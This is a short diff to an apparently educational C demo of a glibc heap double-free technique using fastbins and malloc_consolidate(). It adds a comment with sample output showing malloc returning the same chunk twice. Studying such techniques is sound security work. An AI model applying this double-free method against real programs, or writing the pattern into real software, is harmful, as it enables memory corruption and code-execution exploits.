@@ -17,3 +17,18 @@ int main() {
   fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");
   fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", malloc(0x40), malloc(0x40));
 }
+
+
+
+/*
+
+
+Allocated two fastbins: p1=0x5600c9406260 p2=0x5600c94062b0
+Now free p1!
+Allocated large bin to trigger malloc_consolidate(): p3=0x5600c9406300
+In malloc_consolidate(), p1 is moved to the unsorted bin.
+Trigger the double free vulnerability!
+We can pass the check in malloc() since p1 is not fast top.
+Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x5600c9406260 0x5600c9406260
+
+*/
